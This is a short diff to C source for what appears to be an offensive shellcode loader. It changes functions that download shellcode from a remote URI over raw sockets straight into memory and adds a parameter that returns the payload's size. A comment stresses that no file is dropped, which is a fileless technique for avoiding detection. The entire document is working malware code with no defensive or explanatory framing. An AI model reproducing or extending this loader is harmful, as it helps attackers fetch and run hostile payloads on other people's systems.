@@ -9,7 +9,8 @@
 
 // Downloads the shellcode from the specified URI.
 // Returns pointer to shellcode, memory is allocated by the function.
-unsigned char* download_shellcode(char* uri)
+// shellcode_size receives the size of the shellcode in bytes.
+unsigned char* download_shellcode(char* uri, int *shellcode_size)
 {
 	struct WSAData* wd = (struct WSAData*)malloc(sizeof(struct WSAData));
 	if (WSAStartup(MAKEWORD(2, 0), wd))
@@ -53,7 +54,9 @@ unsigned char* download_shellcode(char* uri)
 		}
 	}
 
+    *shellcode_size = j;
 	unsigned char *sc=(char*)malloc(j * sizeof(char));
+
 	for (i = 0; i < j; i++) 
 	{ 
 		recv(sock, &c, 1, 0); 
@@ -68,11 +71,14 @@ unsigned char* download_shellcode(char* uri)
 }
 
 
-// Downloads the shellcode from the URI specified in arg1
-unsigned char* get_shellcode(char *arg1) {
+// Downloads the shellcode from the URI specified in arg1.
+// No file is dropped, the data is read directly from the socket.
+//
+// shellcode_size receives the size of the shellcode in bytes.
+unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
 	#ifdef PRINT_DEBUG
 		printf("download shellcode from url via sockets\n");
 	#endif
 	
-	return download_shellcode(arg1);
+	return download_shellcode(arg1, shellcode_size);
 }
